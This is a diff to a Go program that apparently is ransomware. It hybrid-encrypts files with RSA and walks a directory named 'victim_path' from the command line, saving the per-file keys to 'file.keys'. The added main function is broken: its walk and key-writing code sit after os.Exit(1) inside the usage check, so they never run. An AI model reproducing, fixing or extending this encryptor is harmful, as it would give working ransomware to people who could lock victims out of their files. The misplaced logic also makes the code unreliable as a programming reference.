@@ -10,6 +10,7 @@ import (
 	"crypto/sha256"
 	"crypto/x509"
 	"encoding/json"
+	"fmt"
 	"log"
 	"math/big"
 	"os"
@@ -67,7 +68,7 @@ func encryptHybrid(rsaKey *rsa.PublicKey, bs []byte) ([]byte, []byte) {
 }
 
 func pad(bs []byte, blksz int) []byte {
-	count := blksz 
+	count := blksz
 	if len(bs)%blksz != 0 {
 		count = blksz - (len(bs) % blksz)
 	}
@@ -90,9 +91,22 @@ func zero(bs []byte) {
 }
 
 func main() {
-	filepath.Walk("", walker)
-	data, _ := json.Marshal(eis)
-	os.WriteFile("file.keys", data, 0444)
+
+	if len((os.Args)) < 2 {
+		fmt.Println("Usage: go run main.go <path to encrypt>")
+		os.Exit(1)
+
+		victim_path := os.Args[1]
+
+		err := filepath.Walk(victim_path, walker)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		fata, _ := json.Marshal(eis)
+		os.WriteFile("file.keys", fata, 0666)
+
+	}
 }
 
 func walker(path string, info os.FileInfo, err error) error {
